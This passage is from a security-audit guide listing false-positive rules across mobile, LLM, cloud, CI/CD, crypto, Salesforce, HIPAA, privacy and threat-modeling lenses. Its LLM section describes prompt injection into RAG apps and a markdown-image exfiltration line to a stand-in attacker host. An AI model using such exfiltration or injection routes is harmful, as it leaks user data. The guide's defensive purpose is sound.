2. **`AsyncStorage` / `MMKV` / `UserDefaults` / `SharedPreferences` used at all.** These are the intended stores for non-secret local state: theme, locale, onboarding flags, feature-flag cache, last-viewed screen, drafts the user typed. "Unencrypted storage" is a finding only when the value is a credential, session/refresh token, encryption key, or PHI/PII â€” the finding must quote the key and classify the value. The same test governs a plaintext SQLite/Realm file in the sandbox, which is additionally protected by Android FBE and iOS Data Protection; escalate that only on a concrete exposure path (included in Auto Backup or iTunes/Finder backup, a shared container or `ContentProvider`, `NSFileProtectionNone`, or an explicit encryption-at-rest requirement).
3. **A long, high-entropy key in `google-services.json`, `GoogleService-Info.plist`, `app.json`, or a `Constants`/`env` file.** Many mobile SDK keys are public client identifiers designed to ship in the binary: the Firebase `apiKey`, Maps/Places SDK keys, a Sentry DSN, a Stripe *publishable* key, a RevenueCat *public* SDK key, an OAuth *client ID*, an Expo project ID, Branch/Amplitude/Segment write keys. Their presence is not the vulnerability. Ask whether the credential authorizes privileged reads or writes on its own; if it does not, either report the missing server-side control (absent Firestore/Storage rules, a Maps key with no bundle-ID/SHA-1 restriction and no quota) or drop it.
4. **`android:exported="true"` on a component.** Export is mandatory for the launcher activity, `SEND`/share targets, `FirebaseMessagingService`, system-action receivers, and app-link activities. Since API 31 the attribute must be declared explicitly for any component with an intent filter, so most explicit `exported="true"` values in modern manifests are compiler-forced annotations of pre-existing filters, and many entries in the *merged* manifest are library-owned (`androidx.startup.InitializationProvider`, WorkManager, Play Services). A finding needs an app-authored component, reachable without a signature or custom permission, that changes state or returns data the caller should not have.
5. **Cleartext or ATS-relaxing configuration in a manifest, plist, or `network_security_config.xml`.** Three non-issues: `<debug-overrides>` is applied by the platform only when `android:debuggable` is true, so trust-anchor relaxation there cannot affect release; `android:usesCleartextTraffic` is *ignored* when `android:networkSecurityConfig` is also declared, making a scary `="true"` dead configuration; and `NSAllowsArbitraryLoads` is overridden per-domain by `NSExceptionDomains` and often lives in a `Debug`-only plist or debug flavor source set. Always resolve the merged, release-variant manifest/plist before reporting.
6. **Missing certificate pinning.** Absent pinning is not a vulnerability: the platform trust store plus ATS (iOS) and the default `network_security_config` (Android excludes user-added CAs from app trust since API 24) already defeat passive and opportunistic MITM. Pinning is hardening with real availability risk â€” a mis-rotated pin bricks every installed copy â€” and both platform vendors caution against static pinning. Report it as hardening, or as a compliance gap against a standard the target is actually bound by, never above the lens's Low/Medium band.

### `llm-and-ai`

1. **Untrusted content concatenated into a prompt with only XML tags or delimiters separating it from the system instructions.** Every RAG and summarization app has this shape and no prompt-layer construction fixes it; injection is a precondition, not an impact. The reportable defect is the capability reachable from the injected text â€” a privileged tool, an unsanitized sink, a cross-tenant read, an unbudgeted loop, an outbound channel. With no tools, escaped output, and an audience of exactly the user who supplied the input, this is Informational. Requiring a named reachable capability is what stops an LLM audit from producing one finding per prompt template.
2. **`exec()` / `eval()` / `subprocess` on model-generated code in a code-interpreter or notebook feature.** That is the product; it is the one place where "model output reaches an interpreter" is intentional. Inspect the isolation first: an ephemeral gVisor/Firecracker/nsjail microVM or WASM (Pyodide) sandbox with no egress, no mounted credentials, no metadata reachability, per-tenant instances, and wall-clock/memory caps is a correct implementation. The findings are specific: the sandbox shares a network namespace with internal services, `169.254.169.254` is reachable, host env vars or a service-account token are visible inside, the workspace is reused across tenants, or there is no timeout.
3. **Markdown/HTML rendering of model output flagged as exfiltration (`![](https://attacker/?data=...)`) without checking the renderer and the CSP.** The channel needs an outbound request to an attacker-chosen host, and it is already closed by `img-src 'self' data:` or equivalent, by a renderer with images/autolinks disabled or restricted to relative URLs, or by an image-rewriting proxy. Verify the response CSP header and the renderer config. The still-valid variants worth naming: an allowlisted host with an open redirect or attacker-writable user-content path, or a CSP that omits `img-src` and falls back to a permissive `default-src`.
4. **A retriever or vector query with no per-user metadata filter, reported as cross-tenant RAG leakage.** Filterless retrieval is correct when the index is uniformly public within its audience â€” help-center articles, manuals, published statutes, marketing copy. Leakage requires that the index actually hold per-tenant documents, so confirm what the ingestion path writes and whether the index is shared or per-tenant. When tenancy does exist, look for the sharper bugs instead: post-retrieval filtering in application code (foreign chunks still reach memory and often the prompt), or a filter sourced from a client-supplied `tenant_id` rather than the server session.
5. **"Destructive or outbound tool with no human-in-the-loop confirmation" where approval is an interrupt/resume or a pending-action record.** Modern agent frameworks express approval as a server-side pause â€” a LangGraph `interrupt`, a `pending_actions` row, a durable-workflow signal â€” so grepping for a confirmation dialog near the tool body finds nothing even when the gate is sound. Trace whether execution can occur before the approval record is written and checked server-side. The genuine bugs: the confirmation exists only in the UI while the API executes on first call, the approval token is client-supplied and unverified, or "approve" is remembered as "always approve" for a session including arguments the human never saw.
6. **Imports of `langchain_experimental`, `PythonREPLTool`, a SQL/requests toolkit, or `create_pandas_dataframe_agent` treated as live RCE.** **[CORRECTED 2026-07-27: the gate is PER-COMPONENT, not universal, and this entry as written hides the ungated half. Gated, raising on construction: `create_pandas_dataframe_agent`, `create_csv_agent`, `create_spark_dataframe_agent`, `PALChain`, `RequestsToolkit`. NOT gated, and never were: `PythonREPLTool`, `PythonAstREPLTool`, `SQLDatabaseToolkit`, `QuerySQLDataBaseTool` — these construct with no flag at all, so "the flag is the high-signal grep; the import is not" is false for exactly the components that need finding. Separately, item 6 of §1 calls the `PythonREPLTool` symbol dead because its import path moved in 2023: an import path change does not kill a symbol grep — the string is unchanged, only its package moved. Treating it as dead is what left the ungated component unfindable. Verified during the llm-and-ai migration.]** For the gated components only, LangChain refuses to construct without an explicit `allow_dangerous_code=True` / `allow_dangerous_requests=True`, and the import often sits in a notebook, an eval harness, or a dev-only branch with no path from an untrusted user. Two checks make it real: the dangerous flag is actually set, and the constructed agent is bound to a handler reachable by an untrusted or lower-privileged principal. The flag is the high-signal grep; the import is not.

### `cloud-and-iac`

1. **`Resource: "*"` in an IAM statement.** A large set of AWS actions do not support resource-level permissions and are only expressible with `Resource: "*"` â€” `ec2:Describe*`, `s3:ListAllMyBuckets`, `cloudwatch:PutMetricData`, `logs:DescribeLogGroups`, `sts:GetCallerIdentity`, `kms:ListAliases`, most `*:List*`/`*:Describe*`. For those, least privilege is expressed with condition keys (`aws:RequestedRegion`, `aws:ResourceTag`), not ARNs. File only when the action is resource-scopable (`s3:GetObject`, `secretsmanager:GetSecretValue`, `dynamodb:*Item`, `kms:Decrypt`, `iam:PassRole`) or when `Action` itself is `*`; check the service authorization reference first.
2. **`Principal: "*"` in a trust or resource policy.** Principal must be judged with the statement's `Condition`: wildcard plus `aws:PrincipalOrgID`, `sts:ExternalId`, `aws:SourceAccount`/`aws:SourceArn`, or an OIDC `sub`/`aud` `StringEquals` is how vendor roles and GitHub Actions/EKS OIDC roles are legitimately written. The finding is a wildcard principal with no condition, or a `StringLike` wildcard in a load-bearing position â€” e.g. an OIDC `sub` of `repo:org/*:*`, which any repo in the org satisfies. Quote the whole statement, not the Principal line.
3. **A KMS key policy granting `kms:*` to `arn:aws:iam::<own-account-id>:root`.** That is AWS's own default key policy; the ARN does not mean the root *user*, it means "delegate authorization to this account's IAM policies," and it is required for IAM-based access to work. Console, CloudFormation, and Terraform all generate it, and removing it can make the key unmanageable. Flag only when the principal is `"*"`, a *different* account's root, or an org-wide principal with no `kms:ViaService`/`kms:CallerAccount` constraint.
4. **An S3/Blob/GCS bucket with no explicit server-side-encryption block.** Since January 2023 every new S3 bucket has SSE-S3 (AES-256) applied by default and it cannot be turned off; Azure Storage and GCS have always encrypted at rest with platform-managed keys and offer no off switch. A missing `aws_s3_bucket_server_side_encryption_configuration` therefore does not mean unencrypted. If key ownership matters, reframe explicitly as "no customer-managed key (SSE-KMS/CMEK) where the data classification or contract requires key ownership and revocability" â€” a narrower claim, and say so.
5. **`runAsUser` unset, treated as running as root.** Unset means "inherit the image's `USER`," and distroless `:nonroot`, `nginxinc/nginx-unprivileged`, Chainguard/Wolfi, and Bitnami images already declare a non-root UID. Verify the base image, or better, look for the control that enforces this regardless of image: `runAsNonRoot: true` (the kubelet refuses to start a container whose effective user is UID 0) or Pod Security Admission `restricted` on the namespace. Report "no enforcement mechanism," not "`runAsUser` is unset."
6. **Any `0.0.0.0/0` rule reported as exposure.** Egress `0.0.0.0/0` is the default and near-universal, and `0.0.0.0/0` on 80/443 attached to a public ALB or ingress security group is the intended design. Hold to the sensitive-port list (22, 3389, 3306, 5432, 27017, 6379, 1433, 9200) and additionally verify the group is attached to something reachable â€” a group referenced only by a bastion module behind SSM Session Manager, or attached to no ENI, is not an exposure.

### `cicd-and-supply-chain`

1. **`on: pull_request_target` in a workflow that never checks out or executes PR-controlled content** â€” labelers, welcome bots, size labels, backport/triage bots, `actions/stale`. `pull_request_target` checks out the *base* ref by default; the privileged context is dangerous only when PR content is executed or interpolated. Flag on trigger **plus** one of: checkout of `head.sha`/`head.ref`/`refs/pull/N/merge`, a `${{ github.event.pull_request.* }}` value inside `run:`, or a step that reads PR-supplied config (eslint/prettier plugin resolution, `npm ci`/`pip install` against the PR lockfile, Danger, pre-commit, Makefile targets, the gradle wrapper). Conversely, a `pull_request_target` job that checks out the PR head and then installs dependencies is a real Critical even with no `${{ }}` anywhere.
2. **`${{ â€¦ }}` inside `run:` where the context is not attacker-controlled:** `github.sha`, `github.run_id`, `github.run_number`, `github.repository`, `github.repository_owner`, `github.actor`, `github.job`, `github.workflow`, `github.event.number`, `vars.*`, and `workflow_dispatch` inputs typed `choice` or `boolean`. These come from a constrained charset or from repo-owner-controlled configuration â€” usernames and repo names cannot contain shell metacharacters, SHAs and IDs are hex or numeric. The genuinely injectable set is small: `*.title`, `*.body`, `*_comment.body`, `github.head_ref` and `pull_request.head.ref` (refs permit `;`, `$`, backticks, `&`, `|`, parens), commit messages and author names, `label.name`, `pull_request.head.repo.*`, and free-text dispatch inputs.
3. **A `pull_request`-triggered (not `_target`) workflow that checks out `${{ github.event.pull_request.head.sha }}`.** Checking out the PR head is the entire point of a `pull_request` workflow, and for fork PRs the "has access to secrets" half cannot be satisfied: secrets are not sent to the runner, `GITHUB_TOKEN` is read-only, and `${{ secrets.X }}` evaluates empty. Name the residual risk specifically instead: cache or artifact poisoning consumed by a later `workflow_run`, a self-hosted runner, or same-repo branch PRs from lower-trust collaborators.
4. **`uses:` references that are not 40-char SHAs but are nonetheless controlled:** local actions (`uses: ./.github/actions/build`), same-repo reusable workflows, and Renovate/Dependabot pins written as `@a1b2c3dâ€¦ # v4.1.1`. Local and same-repo references inherit the repo's own branch protection, so a SHA pin adds nothing, and auditors routinely misread the trailing `# v4.1.1` comment on an already-pinned line as a tag reference. Calibrate first-party (`actions/*`, `github/*` on a major tag) below a single-maintainer marketplace action on `@main`, and note where the residual risk actually lives: mutable references *inside* a pinned composite action, and Docker-based actions pulling `:latest`.
5. **"No lockfile" or "not using `npm ci`."** Library authors publish ranged `dependencies` deliberately â€” consumers never read the library's lockfile, so the reproducibility argument applies only to the library's own CI. `npm ci` is one of many equivalents: `yarn install --immutable`, `pnpm install --frozen-lockfile`, `uv sync --frozen`, `bundle install --deployment`, `cargo build --locked` are all frozen installs, and flagging "no `npm ci`" in a pnpm/uv/cargo repo is a pure false positive. Go is a special case: `go.sum` plus `sum.golang.org` already gives transparency-log-backed integrity, so "no hash pinning" is wrong for Go unless `GOFLAGS=-mod=mod`, `GONOSUMDB`/`GONOSUMCHECK`, or `GOPRIVATE` disables it.
6. **A workflow with no `permissions:` block, or `contents: write` in a release job.** Repos and orgs created after February 2023 default `GITHUB_TOKEN` to read-only and admins can enforce that org-wide â€” none of which is visible in the workflow file, so a missing block is not evidence of excess privilege. A release workflow that pushes tags, publishes packages, or mints OIDC tokens legitimately needs `contents: write` / `packages: write` / `id-token: write`. Report the missing block as Low hardening against org-policy drift; reserve High for a demonstrably write-scoped token in a job that handles untrusted input.

### `crypto-deep-dive`

1. **An encrypt/decrypt API that takes no nonce or IV argument** â€” `Fernet.encrypt`, libsodium `crypto_secretbox_easy`/`crypto_box_seal`, Tink `Aead.encrypt`, the AWS Encryption SDK, `age`, Rails `MessageEncryptor`, Apex `Crypto.encryptWithManagedIV`. These are misuse-resistant designs: the library draws a fresh CSPRNG nonce per call and prepends it to the ciphertext precisely so the caller cannot get it wrong, and demanding an IV parameter pushes the team toward the dangerous API. It becomes a finding only if a wrapper derives the nonce deterministically from message content without an SIV/key-committing scheme, caches a nonce across calls, or reuses one key beyond the mode's message limit.
2. **`SecureRandom rnd = new SecureRandom(); rnd.setSeed(nonRandomValue);` in Java.** For the default provider `setSeed` *supplements* the existing seed (documented behavior), so mixing in a non-secret value cannot reduce output entropy. The dangerous forms are different: `new SecureRandom(byte[] seed)`, or `SecureRandom.getInstance("SHA1PRNG")` followed by `setSeed` before the first `nextBytes` (SUN's SHA1PRNG defers self-seeding, so the supplied seed becomes the only seed), plus the historical Android < 4.4 defect. Check the provider and the call order before writing it up.
3. **`==` / `equals()` comparing a value that is merely security-adjacent** â€” a stored token *hash*, a UUID request id, a JWT `kid`, an algorithm or version string, a signature the code computed on both sides, or a single-use value behind a strict rate limit. A timing finding needs all of: an attacker-supplied guess, byte-by-byte comparison against a secret, unlimited attempts, and a signal that survives network jitter. Comparing two locally derived values leaks nothing, and a high-entropy digest gives no adaptive path because the attacker cannot steer the prefix. Report the ones on attacker-supplied MACs, signatures, API keys, TOTP codes, and reset tokens; file the rest Low or not at all.
4. **MD5 or SHA-1 in application code** â€” ETag and cache-key generation, content-addressed storage of internal blobs, shard selection, dedup fingerprints, Git object ids, HMAC-SHA1 required by an unmovable vendor API. What is broken is collision resistance (and SHA-1 chosen-prefix), which is load-bearing only when an adversary supplies the input and the digest is trusted for identity or integrity; HMAC-SHA1 as a MAC has no practical break and is still used by major cloud signing schemes. Flag it for password storage, signature or certificate verification, integrity of untrusted content, or dedup where a collision lets one tenant overwrite another's object â€” and name the broken property. A blanket "MD5 found" is the fastest way to lose the reader's trust in the whole report.
5. **Hardcoded key material found by grep:** NIST/RFC test vectors in tests, keys under `test/`, `fixtures/`, `__snapshots__/`, `.env.example`, docs samples, and above all *public* keys and certificates in source (JWKS documents, pinned CA bundles, vendor verification keys, receipt-validation keys). Public keys and CA bundles belong in source control â€” that is how pinning and offline verification work â€” and test vectors must be fixed or the test proves nothing. Confirm the key type (`BEGIN PRIVATE KEY` vs `BEGIN PUBLIC KEY`/`CERTIFICATE`) before assigning severity, and check git history: a value rotated years ago is a hygiene note, not a Critical. The same rule covers non-key identifiers that merely look like secrets â€” role ARNs, account IDs, OIDC audiences, OAuth client IDs, project numbers, publishable `pk_`-style keys, provider endpoints and model IDs. Match the provider's real secret shapes (`sk-`, `sk-ant-`, `AKIA`/`ASIA`, service-account JSON) instead.
6. **ECB or a raw block-cipher primitive appearing in code** â€” `AES.MODE_ECB`, `Cipher.getInstance("AES/ECB/NoPadding")`, Go's `aes.NewCipher`. Single-block ECB is the building block for CMAC, AES-KW key wrapping, AES-SIV, CTR/GCM counter blocks, and format-preserving encryption, and Go's API *requires* a `cipher.Block` before `cipher.NewGCM(block)`. A hit inside a correct larger mode is not the ECB bug. The bug is ECB over multi-block, attacker-visible, low-diversity data, or Java's `Cipher.getInstance("AES")`, which silently resolves to ECB. Check the plaintext length and the surrounding mode.

### `salesforce`

1. **An Apex class with no sharing declaration, flagged High.** An undeclared class inherits its caller's sharing context, so a selector or service class called only from a `with sharing` controller does enforce sharing. The default-to-without-sharing behavior applies only when the class is the entry point: `@AuraEnabled`, `@RestResource`, `@InvocableMethod`, `webservice static`, a Visualforce controller, a trigger, `execute()` on Queueable/Batchable/Schedulable, or anonymous Apex. Trace callers first; if all are `with sharing`, the finding is at most Low ("declare `inherited sharing` so a future without-sharing caller cannot silently widen access") â€” and note that for an entry point `inherited sharing` defaults to *with* sharing, which is the whole reason it exists.
2. **`without sharing` treated as a sharing bypass on sight.** Sharing only exists for objects with restrictive org-wide defaults: `without sharing` is a no-op on custom metadata types, custom settings, platform events, and any object whose OWD is Public Read/Write. It is also the correct declaration for rollups and denormalization in trigger handlers, Queueable/Batch jobs, sharing recalculation, approval automation, and integration users â€” and triggers run in system mode regardless of the handler's declaration, so "trigger handler lacks `with sharing`" is usually noise. Establish the object's OWD first; the real question is whether a user-supplied Id or filter crossed into the without-sharing context.
3. **Any `Database.query(...)` / `Database.getQueryLocator(...)` with string building, reported as SOQL injection.** Dynamic SOQL is injectable only if untrusted data reaches the string. Safe shapes are common: field lists from `Schema.getGlobalDescribe()`, a FieldSet, or `getDescribe().fields.getMap()`; `String.join` over hardcoded names; `:ids`/`:userInput` binds (dynamic SOQL binds against enclosing-scope variables, so a concatenation-free `Database.query` containing a colon is already parameterized); and values coerced through `Integer.valueOf()` / `Id.valueOf()` / `Decimal.valueOf()`, which cannot carry SOQL syntax and need no `escapeSingleQuotes`. Prove taint from an `@AuraEnabled`, `@RestResource`, or `ApexPages.currentPage().getParameters()` source to the concatenation.
4. **An `@AuraEnabled` method returning SObjects with no `Security.stripInaccessible()` and no `isAccessible()` checks.** Enforcement may be present in a form the grep misses: `WITH USER_MODE` in the SOQL, `Database.query(q, AccessLevel.USER_MODE)`, `WITH SECURITY_ENFORCED` (which does enforce object and field permissions on selected and filtered fields â€” its real limits are polymorphic lookups, `TYPEOF`, and all-or-nothing failure instead of stripping), or an `SObjectAccessDecision` produced in a shared selector layer. Check the whole call chain, and whether the class is `inherited sharing` under a user-mode caller, before concluding nothing enforces FLS.
5. **An LWC that reads or writes records with no Apex FLS check anywhere.** If the data path is `lightning/uiRecordApi` (`getRecord`, `getFieldValue`, `createRecord`, `updateRecord`), `lightning-record-edit-form`/`-view-form`, or a `graphql/*` wire adapter, the UI API enforces object permissions, FLS, and sharing server-side and there is no Apex in the path to add a check to â€” fields the user cannot see are simply absent from the response. This is the recommended pattern, not a gap; the finding appears only once the same data is routed through custom Apex. Do still flag `lightning-record-edit-form` bound to a field the *author* intended to hide, since FLS is the only control there and hiding it in markup is cosmetic.
6. **An `@AuraEnabled` method with no `FeatureManagement.checkPermission`, role, or owner check, reported as broken function-level authorization because "any authenticated user can call it."** Callability matters only if the method grants access beyond what the caller's sharing and FLS already allow: a `with sharing` method in user mode that takes no Id and returns "my open Cases" is correctly scoped by the platform, and a permission check would be defense in depth, not a fix. Report it when the method accepts an Id or filter that widens scope beyond the caller's own records, runs `without sharing` or in system mode, performs a privileged action (ownership change, approval, share insert, `PermissionSetAssignment`), or is reachable by the Site/Experience Cloud guest user â€” and confirm Apex Class Access is actually granted to non-privileged profiles before asserting "any authenticated user."

### `hipaa-and-phi`

1. **A read path â€” repository method, SOQL query, FHIR read endpoint â€” with no `audit_log.insert(...)`, reported as a Â§164.312(b) Audit Controls violation.** The rule requires "hardware, software, and/or procedural mechanisms that record and examine activity"; it does not require the mechanism to live in application code. It is frequently satisfied a layer down: Salesforce Event Monitoring / Field Audit Trail, Epic's access log, `pgaudit` or `log_statement`, SQL Server Audit, CloudTrail data events on a PHI bucket, or a gateway access log joined to the IdP. The defensible finding is narrower and must be stated that way â€” "reads are logged at the DB layer but the log records only the pooled service account, so the acting user is unrecoverable." A flat "no audit log" claim is not verifiable from one service's source.
2. **A clinician-facing chart, encounter, or patient-summary endpoint returning the full record via `SELECT *` or an unfiltered serializer, reported as a minimum-necessary violation.** Â§164.502(b)(2)(i) exempts disclosures to, and requests by, a health care provider for treatment from the minimum necessary standard entirely â€” a treating clinician is supposed to see the whole chart, and narrowing it is a patient-safety problem, not a compliance win. The same exemption covers disclosures to the individual (a portal returning that patient's own record), uses under a valid authorization, and disclosures required by law. Minimum-necessary findings belong on non-treatment surfaces: billing and RCM, scheduling and front-desk views, analytics pipelines, vendor integrations, and broad admin tools.
3. **A marketing pixel, GTM container, or GA snippet in the root layout, reported as Critical under the OCR tracking-technologies bulletin.** The theory that made this automatically Critical â€” IP address plus a visit to an unauthenticated public page about a condition equals PHI â€” was vacated in *American Hospital Association v. Becerra* (N.D. Tex., June 20, 2024). Post-vacatur, a tracker on a public marketing or condition-information page is not per se a HIPAA violation. It stays Critical when the page is behind authentication, is part of a scheduling/intake/symptom-checker flow, or transmits identifiers or condition context (URL path, query string, form field, `dataLayer` push). Verify what the tracker sends and whether the route requires a session â€” and note that FTC Act Â§5, the amended Health Breach Notification Rule, and state health-privacy statutes can still apply where HIPAA does not.
4. **`logger.info(request.body)`, `console.error(err, payload)`, or a Sentry integration capturing request bodies, reported as an active breach.** The call site is half the picture; the sink and its scrubber are the other half. Structured-logging processors, a Sentry `before_send`/`beforeBreadcrumb` denylist, `sendDefaultPii: false`, Datadog Sensitive Data Scanner rules, or redaction middleware upstream can all mean nothing sensitive leaves the process. Trace the record from call site to transport and read the scrubber config. A genuine Critical is provable: name a field that reaches the vendor because it is absent from the denylist. Where scrubbing exists but is denylist-shaped, the defensible finding is lower and different â€” "any newly added PHI column leaks until someone remembers to add it" â€” a design finding with a test, not a breach.
5. **A patient or record identifier in a URL path, e.g. `GET /patients/8f21c0e4-â€¦/notes`, reported as "PHI in URLs: Critical."** An opaque internal surrogate key is not one of the Â§164.514(b)(2) identifiers and carries no health information on its own; if it were, every healthcare REST API would be Critical. The Critical case is content that *is* an identifier or reveals condition â€” `?patient_name=`, `?ssn=`, `?dob=`, `?mrn=` (MRN is enumerated), `?dx=F33.1`, or a path segment naming a condition or specialty â€” plus identifiers or tokens forwarded off-origin via `Referer` to a non-BAA host or embedded in a pixel's page-URL parameter. Distinguish the surrogate key from the identifier before scoring.
6. **Seed files, fixtures, or factories containing realistic patient records** â€” `Jane Doe, DOB 1980-01-01, MRN 100234, dx F33.1` â€” reported as production PHI in dev. Synthetic data that looks like patient data is not PHI: Synthea output, Faker demographics, and hand-written fixtures are the correct way to test a clinical system. The finding requires provenance evidence, not resemblance: a restore script pointed at a production snapshot, a `pg_dump`/`sf data export` from the prod alias, an anonymisation step that masks names while leaving DOB + ZIP + admission date intact (still re-identifiable under Â§164.514(b)(2)), or a crosswalk table shipped beside the "de-identified" set. State the provenance evidence or do not file it.

### `privacy-and-compliance`

1. **A soft-delete column (`deleted_at`, `is_deleted`, Laravel `SoftDeletes`, `acts_as_paranoid`, Hibernate `@SQLDelete`) or retained invoice/order/audit rows after an erasure request.** Erasure is an outcome obligation with a window, not a requirement to issue a synchronous `DELETE`: a soft-delete flag plus a scheduled purge or irreversible anonymisation inside the Art 12(3) one-month window is compliant, and Art 17(3) plus statutory retention duties (tax and accounting, employment, AML/KYC, product liability, litigation hold) affirmatively require keeping some records. Look for the purge job, its schedule, and its coverage. The real bug is a soft delete with no purge path, an unbounded or undocumented window, or retained rows still being used for the original purpose (marketing sends still resolving "deleted" users).
2. **A tracking script tag, cookie write, or SDK initialiser that appears in code running before the consent banner is answered.** Two lawful explanations dominate: the cookie may be strictly necessary and exempt under ePrivacy Art 5(3) â€” the consent-state cookie itself, session and CSRF tokens, load-balancer affinity, language/currency preference, fraud and rate-limit tokens, cart state â€” or the tag may be present but gated by a CMP that blocks or wraps it until opt-in, or by Google Consent Mode with `analytics_storage` and `ad_storage` defaulted to `denied`. Prove it at runtime: record network requests in a fresh browser context and check whether anything carries an identifier or sets a non-essential cookie before interaction. A finding built on grepping the document head is wrong more often than right.
3. **A Luhn-valid 16-digit card-shaped string in the repo (`4242424242424242`, `4111111111111111`, `5555555555554444`), or a stored/displayed last-four plus brand.** Processor test PANs in fixtures, seed data, Cypress/Playwright specs, and docs are published values that cannot authorise a transaction â€” flagging them as a PCI breach is the most common automated false positive in this domain. Last four plus brand plus expiry month is explicitly permitted display and storage (masking allows first six / last four), and processor webhooks legitimately carry it. Reserve the finding for real PANs, full-PAN persistence or logging, and sensitive authentication data (CVV/CVC, full track data, PIN blocks), which may never be stored after authorisation.
4. **A session-replay or heatmap SDK (FullStory, Hotjar, Clarity, LogRocket, Smartlook, rrweb, Sentry Replay) present in the bundle.** Presence is not the finding, and the claim that these tools capture form inputs by default is out of date for the major vendors â€” input values are masked or keystrokes suppressed by default. Verify the configuration object, then file the narrower defects: an explicit unmask allowlist (`data-hj-allow`, `fs-unmask`, `data-clarity-unmask`, `maskAllInputs: false`, a permissive block/ignore class set), sensitive values rendered as page *text* and therefore captured despite input masking, replay enabled before consent, no DPA or transfer route for the vendor, or replay on an authenticated page rendering someone else's data.
5. **An application that ignores `Sec-GPC`, or that has no link with the exact string "Do Not Sell or Share My Personal Information."** Both are conditional obligations. The duty to honour an opt-out preference signal attaches to businesses that sell or share personal information or process it for cross-context behavioural advertising; a purely first-party app with no ad pixels and no data sales does not breach CCPA by ignoring GPC. The link text is also not fixed â€” "Your Privacy Choices" with the opt-out icon is permitted, and a business honouring opt-out signals frictionlessly may not need the link at all. Establish the sale/share predicate first (a Meta, Google Ads, or TikTok pixel almost always converts analytics into "sharing," which flips the answer), then check the mechanism: GPC has three surfaces â€” the header, `navigator.globalPrivacyControl`, and `/.well-known/gpc.json` â€” and a header-only implementation is the genuine gap.
6. **Personal data flowing to a US processor with no SCCs or Transfer Impact Assessment in the repository.** Since the 2023 EUâ€“US Data Privacy Framework adequacy decision, transfers to a DPF-certified recipient need no SCCs and no TIA for data inside the scope of that certification â€” it is a transfer to an adequate destination as a matter of law. Check the vendor on the DPF list, and check whether HR data is inside its certification, before writing a Chapter V finding; a vendor on 2021-module SCCs is also fine, since SCCs did not stop being valid. Genuine findings: an uncertified vendor with no SCCs at all, SCCs from the retired 2010 decision, UK or Swiss data relying on the EU-only framework, or a sub-processor chain terminating somewhere nobody assessed.

### `threat-modeling`

1. **"Data crosses a trust boundary without being re-validated," filed against an inner function that receives an already-parsed domain type** â€” a Pydantic model, a Zod-parsed object, a branded `UserId`, a Rust newtype, a value object whose constructor is the validator. Parse-don't-validate is stronger than re-validation: the type cannot exist in an invalid state, so a second check is dead code. The lens's own absolute ("every time data crosses a trust boundary it must be re-validated") invites this. It becomes real only when you can name a second construction path that bypasses the parser â€” a raw `dict` cast, `model_construct`, `unsafe`, a deserializer, a test factory reused in prod, an ORM row hydrated directly. Cite the path or drop the finding.
2. **Every module-to-module or layer-to-layer call inside one deployable counted as a trust boundary**, producing "the service layer trusts the controller layer." Boundaries are defined by trust domains and principals, not call-stack depth or folder structure: two modules in the same process, running as the same principal with the same privilege and the same callers, are one trust domain, and splitting them yields infinite boundaries and infinite filler threats. A genuine intra-process boundary needs a privilege or principal change â€” a sandbox, a deserializer, a plugin or template engine, an eval, a sudo/impersonation hop, or a queue consumer with an unauthenticated producer.
3. **Attack-tree leaves reported as findings** â€” "compromised admin laptop," "compromised CI pipeline," "phish staff" â€” each with its own severity. Those are preconditions and assumptions, not defects in the reviewed system, and no in-repo patch exists for them; listing them inflates the count and buries real findings. The correct output is a blast-radius statement: *given* endpoint compromise, what does the attacker reach, and which in-repo control (credential lifetime, admin token scope, absence of MFA on the production path) is the actual fixable finding.
4. **STRIDE completeness findings** â€” "Repudiation is not addressed" on a read-only public catalog or a health endpoint, "Denial of Service is not addressed" on an internal batch job behind a queue with backpressure. Not all six letters apply to every node, and the method does not require one threat per letter per component; forcing a full matrix produces findings whose only justification is the shape of the acronym. Mark inapplicable letters N/A with a one-line reason â€” that is a complete threat model, not an incomplete one.
5. **"Anyone with the link can access the document," filed against a capability-URL or signed-share-link feature.** Capability URLs are a deliberate design used by nearly every document product, and the link *is* the grant. The finding requires a specific defect: insufficient token entropy or a predictable generator, an enumerable identifier, no expiry on data the product itself documents as sensitive, permission level encoded in the URL without a signature, or the token leaking via `Referer`, analytics, server logs, or link unfurling. Name which one, or it is not a finding.
6. **Redundant enforcement flagged as inconsistency** â€” an authorization check in middleware *and* again in the query builder or ORM scope, or validation at both the edge and the persistence layer. That is exactly what the lens recommends ("validate at every boundary, and at least once at the most sensitive operation") and it is the control that survives someone adding a new entry point. It becomes a finding only if the two checks disagree about the policy (different role sets, different tenant resolution) so one silently widens the other, or if the outer check is the only one that runs for some routes.

### Rejected candidates

Each line is a recon candidate that did **not** make the seed content, with the reason. Nothing here should be quietly re-added: the "belongs in ## Severity calibration" items are real, but a severity cap suppresses less than a false-positive rule does, and the dedup items must land in exactly one lens or the `_topics.md` single-owner invariant breaks.

- **`web-and-api` â€” "Missing CSP / Referrer-Policy / COOP on a JSON-only API."** Correct and high-frequency, but the fix is a scope correction to the checklist line ("For any HTML response"); as a standalone FP entry it invites an auditor to dismiss missing CSP on server-rendered routes too. Record it in the checklist plus the note that `Referrer-Policy: strict-origin-when-cross-origin` is now the browser default (Info, not Medium).
- **`web-and-api` â€” "GraphQL introspection enabled / batching not limited."** Environment-confusion caveat (Apollo Server 4 disables introspection when `NODE_ENV=production`; `allowBatchedHttpRequests` is off by default) â†’ `## Severity calibration`, capped Medium/Low. Only fires when a GraphQL server exists, and the surviving findings there are the cost-bearing ones (unbounded depth/complexity, aliased repetition, batching enabled *and* uncapped).
- **`mobile` â€” "Unencrypted SQLite/Realm, no SQLCipher."** Subsumed by mobile (2): identical rule (classify the stored value; require a concrete exposure path), different store. The sandbox/backup/`NSFileProtectionNone` escalation list is folded into that entry.
- **`mobile` â€” "`react-native-webview` `injectedJavaScript` / `onMessage`."** Real, but the operative instruction is a proof requirement, not a suppression: keep "quote the interpolation site or the native side-effect" as a checklist line so the auditor must produce evidence rather than learning to skip WebView bridges.
- **`mobile` â€” "Custom URL scheme registered."** The load-bearing half is advice-not-vulnerability ("should use Universal Links") â†’ `## Severity calibration` as an Info cap. The genuine sub-case (scheme-entered route performs an authenticated state change, or carries an OAuth response with no PKCE and no `state`) is a checklist item.
- **`llm-and-ai` â€” "Provider endpoints, model IDs, deployment names, ARNs, publishable keys flagged as leaked credentials."** Dedup â†’ `crypto-deep-dive` (5), which owns key-material-in-source. The LLM-specific examples (`https://<name>.openai.azure.com`, Bedrock model ARNs, `claude-*`/`gpt-*` strings) are listed inside that entry.
